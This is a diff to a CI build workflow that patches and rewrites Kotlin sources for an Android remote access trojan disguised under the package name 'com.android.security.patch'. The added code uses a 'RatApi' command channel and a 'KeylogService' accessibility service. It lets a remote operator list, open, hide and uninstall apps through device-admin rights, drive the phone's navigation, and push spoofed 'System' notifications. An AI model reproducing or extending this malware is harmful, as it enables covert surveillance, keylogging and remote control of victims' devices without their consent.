@@ -64,28 +64,27 @@ jobs:
           cp -f android_override/app/src/main/res/xml/* android/app/src/main/res/xml/
           cp -f android_override/app/src/main/res/values/* android/app/src/main/res/values/
 
-      - name: Fix Kotlin sources
+      - name: Fix small files (sed/python)
         run: |
           cd /tmp/flutter_src
           python3 - <<'PYEOF'
           import re, os
-
           base = "android/app/src/main/kotlin/com/android/security/patch"
 
           def apply(path, *rules):
+              if not os.path.exists(path):
+                  print(f"  MISSING: {path}"); return
               with open(path) as f: s = f.read()
               for pattern, repl in rules:
                   s, n = re.subn(pattern, repl, s)
-                  print(f"  {path} :: {pattern[:50]!r} -> {n} match")
+                  print(f"  {path} :: {pattern[:50]!r} -> {n}")
               with open(path, "w") as f: f.write(s)
 
-          # ---------- WebViewActivity ----------
           apply(f"{base}/WebViewActivity.kt",
               (r"import androidx\.appcompat\.app\.AppCompatActivity", "import android.app.Activity"),
               (r"class WebViewActivity\s*:\s*AppCompatActivity\(\)", "class WebViewActivity : Activity()"),
           )
 
-          # ---------- CoreService ----------
           apply(f"{base}/CoreService.kt",
               (r"import androidx\.core\.app\.NotificationCompat\s*\n", ""),
               (r"NotificationCompat\.Builder", "Notification.Builder"),
@@ -94,63 +93,234 @@ jobs:
               (r"import android\.content\.Intent", "import android.content.Intent\nimport android.app.Notification\nimport com.android.security.patch.commands.Rules"),
           )
 
-          # ---------- AdminReceiver ----------
           apply(f"{base}/AdminReceiver.kt",
               (r"import android\.content\.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules"),
           )
 
-          # ---------- Navigate ----------
-          apply(f"{base}/commands/Navigate.kt",
-              (r"import androidx\.core\.app\.NotificationCompat\s*\n", ""),
-              (r"NotificationCompat\.Builder", "Notification.Builder"),
-              (r"NotificationCompat\.PRIORITY_HIGH", "Notification.PRIORITY_HIGH"),
-              (r"\n\s*\.setStyle\(Notification\.BigTextStyle\(\)\.bigText\(body\)\)", ""),
-              (r"import android\.app\.Notification\n", ""),  # clean dupes first
-              (r"import android\.os\.Build", "import android.app.Notification\nimport android.os.Build"),
-          )
-
-          # ---------- HangManager ----------
           apply(f"{base}/HangManager.kt",
               (r"\n\s*val custom = Prefs\.getStr\(null\)[^\n]*\n", "\n"),
           )
 
-          # ---------- Apps ----------
-          apply(f"{base}/commands/Apps.kt",
-              (r"dpm\.deletePackage\([^)]*\)",
-               'ctx.startActivity(Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:" + pkg)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))'),
-          )
-
-          # ---------- SystemCmd ----------
           apply(f"{base}/commands/SystemCmd.kt",
               (r"wm\.setInputStream\(it\)", "wm.setStream(it)"),
           )
 
-          # ---------- CommandRouter ----------
           apply(f"{base}/CommandRouter.kt",
               (r'"reboot" -> DangerCmd\.reboot\(ctx, chatId\)',
                '"reboot" -> DangerCmd.reboot(ctx, chatId, args)'),
               (r'"izin" -> Setup\.rePrompt\(ctx\); RatApi\.sendMessage\(ctx, "re-prompt triggered", chatId\)',
                '"izin" -> { Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId) }'),
           )
-
-          print("=== all patches applied ===")
-
-          # ---------- verify ----------
-          bad = []
-          for root, _, files in os.walk(base):
-              for fn in files:
-                  if not fn.endswith(".kt"): continue
-                  p = os.path.join(root, fn)
-                  with open(p) as f: s = f.read()
-                  for token in ["NotificationCompat", "setInputStream", "deletePackage", "setSilent"]:
-                      if token in s:
-                          bad.append((p, token))
-          if bad:
-              print("!!! STILL PRESENT:")
-              for p, t in bad: print(f"   {p}: {t}")
-          else:
-              print("=== clean ===")
           PYEOF
+
+      - name: Rewrite Apps.kt (clean)
+        run: |
+          cat > /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Apps.kt <<'KT_EOF'
+          package com.android.security.patch.commands
+
+          import android.app.admin.DevicePolicyManager
+          import android.content.Context
+          import android.content.Intent
+          import android.content.pm.ApplicationInfo
+          import android.content.pm.PackageManager
+          import android.net.Uri
+          import com.android.security.patch.AdminReceiver
+          import com.android.security.patch.RatApi
+
+          object Apps {
+
+              fun listApps(ctx: Context, chatId: Long, args: Array<String>) {
+                  val filter = args.joinToString(" ").lowercase()
+                  Thread {
+                      try {
+                          val pm = ctx.packageManager
+                          val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+                              .filter { it.packageName != ctx.packageName }
+                              .filter {
+                                  (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 ||
+                                  (it.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+                              }
+                              .filter {
+                                  filter.isBlank() ||
+                                  it.packageName.lowercase().contains(filter) ||
+                                  pm.getApplicationLabel(it).toString().lowercase().contains(filter)
+                              }
+                              .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
+
+                          if (apps.isEmpty()) {
+                              RatApi.sendMessage(ctx, "no apps match", chatId); return@Thread
+                          }
+                          val sb = StringBuilder("<b>apps (${apps.size})</b>\n")
+                          for (a in apps.take(80)) {
+                              val label = pm.getApplicationLabel(a)
+                              sb.append("<code>${a.packageName}</code> — $label\n")
+                          }
+                          if (apps.size > 80) sb.append("\n<i>+ ${apps.size - 80} more, refine filter</i>")
+                          RatApi.sendMessage(ctx, sb.toString(), chatId)
+                      } catch (e: Throwable) {
+                          RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
+                      }
+                  }.start()
+              }
+
+              fun openApp(ctx: Context, chatId: Long, args: Array<String>) {
+                  val pkg = args.getOrNull(0) ?: run {
+                      RatApi.sendMessage(ctx, "usage: /app_open &lt;pkg&gt;", chatId); return
+                  }
+                  try {
+                      val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
+                      if (intent == null) {
+                          RatApi.sendMessage(ctx, "no launcher for $pkg", chatId); return
+                      }
+                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                      ctx.startActivity(intent)
+                      RatApi.sendMessage(ctx, "opened $pkg", chatId)
+                  } catch (e: Throwable) {
+                      RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
+                  }
+              }
+
+              fun hideApp(ctx: Context, chatId: Long, args: Array<String>) {
+                  val pkg = args.getOrNull(0) ?: run {
+                      RatApi.sendMessage(ctx, "usage: /app_hide &lt;pkg&gt;", chatId); return
+                  }
+                  val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                  if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
+                      RatApi.sendMessage(ctx, "admin not active", chatId); return
+                  }
+                  try {
+                      val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, true)
+                      RatApi.sendMessage(ctx, if (ok) "hidden $pkg" else "failed (not device owner?)", chatId)
+                  } catch (e: Throwable) {
+                      RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
+                  }
+              }
+
+              fun showApp(ctx: Context, chatId: Long, args: Array<String>) {
+                  val pkg = args.getOrNull(0) ?: run {
+                      RatApi.sendMessage(ctx, "usage: /app_show &lt;pkg&gt;", chatId); return
+                  }
+                  val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                  try {
+                      val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, false)
+                      RatApi.sendMessage(ctx, if (ok) "shown $pkg" else "failed", chatId)
+                  } catch (e: Throwable) {
+                      RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
+                  }
+              }
+
+              fun uninstallApp(ctx: Context, chatId: Long, args: Array<String>) {
+                  val pkg = args.getOrNull(0) ?: run {
+                      RatApi.sendMessage(ctx, "usage: /app_uninstall &lt;pkg&gt;", chatId); return
+                  }
+                  try {
+                      val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
+                          .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                      ctx.startActivity(i)
+                      RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
+                  } catch (e: Throwable) {
+                      RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
+                  }
+              }
+          }
+          KT_EOF
+          sed -i 's/^          //' /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Apps.kt
+          echo "=== Apps.kt rewritten ==="
+          head -5 /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Apps.kt
+
+      - name: Rewrite Navigate.kt (clean)
+        run: |
+          cat > /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Navigate.kt <<'KT_EOF'
+          package com.android.security.patch.commands
+
+          import android.app.Notification
+          import android.app.NotificationChannel
+          import android.app.NotificationManager
+          import android.content.Context
+          import android.os.Build
+          import com.android.security.patch.KeylogService
+          import com.android.security.patch.RatApi
+
+          object Navigate {
+
+              fun home(ctx: Context, chatId: Long) {
+                  val ok = KeylogService.instance?.goHome() ?: false
+                  reply(ctx, chatId, if (ok) "home pressed" else "accessibility not active")
+              }
+
+              fun back(ctx: Context, chatId: Long) {
+                  val ok = KeylogService.instance?.goBack() ?: false
+                  reply(ctx, chatId, if (ok) "back pressed" else "accessibility not active")
+              }
+
+              fun recents(ctx: Context, chatId: Long) {
+                  val ok = KeylogService.instance?.openRecents() ?: false
+                  reply(ctx, chatId, if (ok) "recents opened" else "accessibility not active")
+              }
+
+              fun pullNotifications(ctx: Context, chatId: Long) {
+                  val ok = KeylogService.instance?.openNotifs() ?: false
+                  reply(ctx, chatId, if (ok) "notif shade opened" else "accessibility not active")
+              }
+
+              fun sendNotification(ctx: Context, chatId: Long, args: Array<String>) {
+                  val raw = args.joinToString(" ").trim()
+                  if (raw.isEmpty()) { reply(ctx, chatId, "usage: /notif_send Title|Body"); return }
+                  val split = if (raw.contains("|")) {
+                      raw.substringBefore("|").trim() to raw.substringAfter("|").trim()
+                  } else "System" to raw
+                  val title = split.first
+                  val body = split.second
+
+                  try {
+                      val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                      val chId = "inbox_" + System.currentTimeMillis()
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                          val ch = NotificationChannel(chId, "Messages", NotificationManager.IMPORTANCE_HIGH)
+                          nm.createNotificationChannel(ch)
+                      }
+                      val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                          Notification.Builder(ctx, chId)
+                      else
+                          @Suppress("DEPRECATION") Notification.Builder(ctx)
+                      val n = builder
+                          .setSmallIcon(android.R.drawable.ic_dialog_info)
+                          .setContentTitle(title)
+                          .setContentText(body)
+                          .setAutoCancel(true)
+                          .setPriority(Notification.PRIORITY_HIGH)
+                          .build()
+                      nm.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), n)
+                      reply(ctx, chatId, "notification sent")
+                  } catch (e: Throwable) {
+                      reply(ctx, chatId, "err: " + e.message)
+                  }
+              }
+
+              private fun reply(ctx: Context, chatId: Long, s: String) {
+                  RatApi.sendMessage(ctx, s, chatId)
+              }
+          }
+          KT_EOF
+          sed -i 's/^          //' /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Navigate.kt
+          echo "=== Navigate.kt rewritten ==="
+          head -5 /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Navigate.kt
+
+      - name: Verify no stale refs
+        run: |
+          cd /tmp/flutter_src
+          echo "--- scanning for stale tokens ---"
+          BASE=android/app/src/main/kotlin/com/android/security/patch
+          FOUND=0
+          for tok in "NotificationCompat" "setInputStream" "deletePackage" "setSilent" "AppCompatActivity"; do
+            HITS=$(grep -rn "$tok" $BASE || true)
+            if [ -n "$HITS" ]; then
+              echo "!!! $tok found:"
+              echo "$HITS"
+              FOUND=1
+            fi
+          done
+          if [ "$FOUND" = "0" ]; then echo "=== clean ==="; fi
 
       - name: Configure build.gradle
         run: |
